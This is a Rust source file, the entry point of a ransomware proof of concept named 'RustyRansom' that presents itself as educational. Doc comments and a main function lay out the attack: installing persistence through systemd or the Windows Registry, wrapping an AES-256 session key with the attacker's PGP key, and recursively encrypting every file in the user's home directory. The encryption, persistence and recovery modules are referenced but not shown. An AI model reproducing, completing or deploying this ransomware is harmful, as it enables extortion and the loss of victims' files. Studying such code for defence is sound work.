//! # RustyRansom - Proof of Concept Ransomware
//!
//! Educational ransomware PoC demonstrating hybrid cryptography, cross-platform
//! persistence, and secure key management in Rust.
//!
//! ## Architecture
//!
//! - **Encryption**: AES-256-GCM streaming encryption with per-file nonces
//! - **Key Recovery**: PGP-protected session key (only attacker can decrypt)
//! - **Persistence**: OS-specific mechanisms (systemd on Linux, Registry on Windows)
//! - **Self-Protection**: Extension blacklist and self-executable detection
//!
//! ## Execution Flow
//!
//! 1. Install OS-specific persistence mechanism
//! 2. Generate random AES-256 session key
//! 3. Protect session key with embedded PGP public key
//! 4. Recursively encrypt all files in home directory
//! 5. Zeroize session key from memory
//!
//! ## Security Features
//!
//! - **Memory Safety**: Session key zeroized after use (prevents cold-boot attacks)
//! - **Self-Protection**: Ransomware binary never encrypted (blacklist + path detection)
//! - **Forward Secrecy**: New session key per execution
//! - **No Privilege Escalation**: Operates with user-level permissions only
//!
//! ## Disclaimer
//!
//! **FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.**

mod encryption;
mod persistence;
mod recovery;

use aes_gcm::{aead::OsRng, Aes256Gcm, KeyInit};
use dirs2::home_dir;
use encryption::encrypt_files;
use persistence::install_persistence;
use recovery::save_key;
use zeroize::Zeroize;

/// Ransomware entry point - orchestrates persistence, key management, and encryption.
///
/// This function coordinates the complete ransomware operation:
/// 1. **Persistence**: Install system-level auto-start mechanism
/// 2. **Key Generation**: Create random AES-256 session key
/// 3. **Key Protection**: Encrypt session key with attacker's PGP public key
/// 4. **File Encryption**: Recursively encrypt all files in home directory
/// 5. **Memory Cleanup**: Zeroize session key from RAM
///
/// # Error Handling
///
/// - **Persistence Failure**: Logged but non-fatal (encryption continues)
/// - **Key Save Failure**: Fatal error (panics with error message)
/// - **Encryption Errors**: Handled per-file in `encrypt_files()` (resilient)
///
/// # Panics
///
/// - Cannot resolve home directory (`$HOME` / `%USERPROFILE%` missing)
/// - Failed to save recovery key file (critical - victim needs key to pay ransom)
///
/// # Execution Order Rationale
///
/// - **Persistence first**: Ensures ransomware survives even if process is killed mid-encryption
/// - **Key save before encryption**: Guarantees recovery file exists before any files encrypted
/// - **Zeroize last**: Ensures key not leaked in memory dumps/swap after encryption complete
fn main() {
    let dir = home_dir().expect("[!] Could not open home directory");

    // Install persistence - logs error but continues if it fails
    if let Err(e) = install_persistence() {
        println!("[!] Persistence installation failed: {e}");
    }

    // Generate cryptographically secure random AES-256 key (32 bytes)
    let mut key = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);

    // Save PGP-encrypted recovery key - must succeed before encryption starts
    save_key(key.to_vec()).expect("[!] Failed to save the recovery key");

    // Recursively encrypt all files in home directory
    encrypt_files(dir, cipher);

    // Zeroize session key from memory (prevents recovery from RAM dumps)
    key.zeroize();
}
